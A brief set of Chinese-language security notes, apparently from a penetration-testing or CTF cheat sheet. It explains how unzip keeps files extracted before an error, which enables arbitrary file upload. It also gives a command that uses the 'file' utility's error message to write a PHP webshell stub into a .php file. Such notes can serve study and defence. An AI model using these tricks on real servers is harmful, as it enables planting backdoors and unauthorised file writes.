# unzip
unzip解压的特殊性：解压是按“轮询”的方式进行，即解压成功的文件会保留，遇到错误立即停止，之前解压成功的文件不会自动删除   ---->  任意文件上传
# file
file命令的webshell写入：`file '<?php $_GET[\"a\"];#' >/home/wbh/xx.php`，file命令的作用就是用于辨识文件类型，单引号包裹的是文件名，前面命令执行的结果是识别出`<?php $_GET[\"a\"];#`文件的文件类型结果写进`xx.php`文件中，原本上就不存在`<?php $_GET[\"a\"];#`文件，因此将```<?php $_GET[\"a\"];#: cannot open `<?php $_GET[\"a\"];#' (No such file or directory)```结果写进去`xx.php`文件中
